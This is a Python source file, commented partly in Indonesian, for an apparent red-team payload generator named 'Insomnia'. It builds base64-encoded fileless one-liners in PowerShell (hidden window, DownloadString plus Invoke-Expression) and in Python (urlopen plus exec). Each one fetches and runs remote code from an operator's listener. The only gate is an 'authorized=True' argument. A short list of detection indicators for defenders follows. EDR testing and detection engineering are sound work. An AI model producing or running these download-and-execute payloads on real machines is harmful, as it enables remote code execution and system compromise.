"""
Insomnia v1 — Memory-Resident Payload Toolkit (simulasi) v1.9.0.
AUTHORIZED TESTING ONLY — ENGAGEMENT ONLY.

Membuat ONE-LINER fileless (powershell/python) untuk digunakan HANYA di
lab/engagement ber-scope tertulis, sebagai uji EDR/AV: payload hidup di
memori (tidak menulis disk), beacon singkat ke listener operator, lalu
self-terminate. VANTHEX TIDAK mengeksekusi payload ini — generator +
penjelasan indikator deteksi.

Gating: generate() wajib menerima `authorized=True` secara eksplisit.
"""
import base64 as _b64

PAYLOAD_KINDS = ("powershell", "python")


def generate(kind, listener_url, authorized=False, beacon_id="insomnia"):
    """Return one-liner fileless + indikator deteksi yang HARUS dites."""
    if not authorized:
        raise ValueError("Insomnia: authorized=True required (written-scope "
                         "engagement)")
    if kind not in PAYLOAD_KINDS:
        raise ValueError(f"kind must be one of {PAYLOAD_KINDS}")
    if kind == "powershell":
        script = (
            "$ProgressPreference='SilentlyContinue';"
            f"$d=(New-Object Net.WebClient).DownloadString('{listener_url}/b?i={beacon_id}');"
            "Invoke-Expression $d; Start-Sleep 30; exit")
        b64 = _b64.b64encode(script.encode()).decode()
        return {"kind": kind, "one_liner":
                f"powershell -nop -w hidden -enc {b64}",
                "note": "no file drop (download+IEX); 30s beacon "
                        "then exit — test: does the EDR see IEX+WebClient"}
    script = (
        "import urllib.request as u,os;"
        f"s=u.urlopen('{listener_url}/b?i={beacon_id}').read();"
        "exec(s);os._exit(0)")
    b64 = _b64.b64encode(script.encode()).decode()
    return {"kind": kind, "one_liner": f"python3 -c \"import base64;"
            f"exec(base64.b64decode('{b64}'))\"",
            "note": "exec from memory; test: does the EDR flag "
                    "urlopen->exec (python telemetry rarely audited)"}


def detection_indicators(kind):
    """Checklist indikator untuk SOC (apa yang HARUS memicu alert)."""
    common = ["odd parent→child process (office/browser→interpreter)",
              "outbound to a new domain within <5 min of boot"]
    if kind == "powershell":
        return common + ["-enc/-w hidden flag", "IEX/DownloadString combo",
                         "AMSI bypass attempt"]
    return common + ["direct urlopen followed by exec()",
                     "large base64 in argv"]
